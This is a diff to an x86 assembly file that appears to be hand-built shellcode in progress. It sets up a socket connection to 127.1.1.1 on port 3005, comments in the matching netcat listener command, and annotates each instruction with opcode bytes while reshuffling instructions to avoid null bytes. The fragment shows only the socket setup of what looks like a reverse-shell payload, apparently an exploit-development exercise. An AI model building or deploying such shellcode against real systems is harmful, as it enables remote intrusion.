@@ -32,21 +32,24 @@ section .text
 
 # nc -l -p 3005 -s 127.1.1.1
 
+# 68 7f 01 01 01 66 68 0b bd 66 68 67 01 58
+
 _start:
 
     push 0x0101017f     ;; 68 7f 01 01 01
     push word 0xbd0b    ;; 66 68 0b bd
 
-
-    ; mov ax, 0x0167      ;; 66 B8 67 01
+    sub eax, eax          ;; 29 c0
     push word 0x0167      ;; 66 68 67 01
-    pop eax                ;; 58
-    ; mov bl, 0x2         ;; B3 02
+    pop eax               ;; 58
+    
+    push eax            ;; 50
+    pop ebx             ;; 5b
     push 0x2            ;; 6a 02
     pop ebx             ;; 5b
 
-    ; push bx             ;; 66 53
 
+    xor ecx, ecx        ;; 31 c9
     push 0x1            ;; 6a 01
     pop ecx             ;; 59
 
